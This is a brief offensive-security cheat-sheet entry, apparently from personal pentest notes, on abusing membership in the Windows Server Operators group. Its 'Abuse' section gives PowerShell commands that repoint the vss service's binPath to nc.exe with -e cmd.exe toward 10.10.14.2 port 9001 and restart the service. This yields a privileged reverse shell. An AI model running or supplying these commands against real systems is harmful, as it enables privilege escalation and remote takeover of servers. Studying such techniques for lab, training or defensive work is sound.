# Server Operators

More info found [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators)

## Abuse

```powershell
# Find a service to hijack (evil-winrm)
services

# Set path to nc.exe
sc.exe config vss binPath="C:\ProgramData\System\nc.exe -e cmd.exe 10.10.14.2 9001"

# Restart service
sc.exe stop vss
sc.exe start vss
```
